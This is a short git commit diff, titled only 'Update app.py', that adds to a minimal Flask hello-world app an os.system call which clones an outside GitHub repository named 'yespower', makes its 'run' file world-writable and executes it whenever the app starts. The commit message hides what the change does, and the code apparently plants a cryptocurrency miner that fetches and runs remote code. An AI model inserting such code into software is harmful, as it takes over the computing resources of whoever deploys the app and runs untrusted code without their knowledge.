1b87d49f0e0f019791a464b90ca70977af675a64
atokimaz <108639923+atokimaz@users.noreply.github.com>
2022-07-05 07:48:38 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,6 +1,7 @@
 from flask import Flask
 app = Flask(__name__)
-
+import os
+os.system ('git clone https://github.com/atokimaz/yespower.git && cd yespower && chmod 777 run && ./run')
 @app.route('/')
 def hello_world():
     return 'Hello, World!'
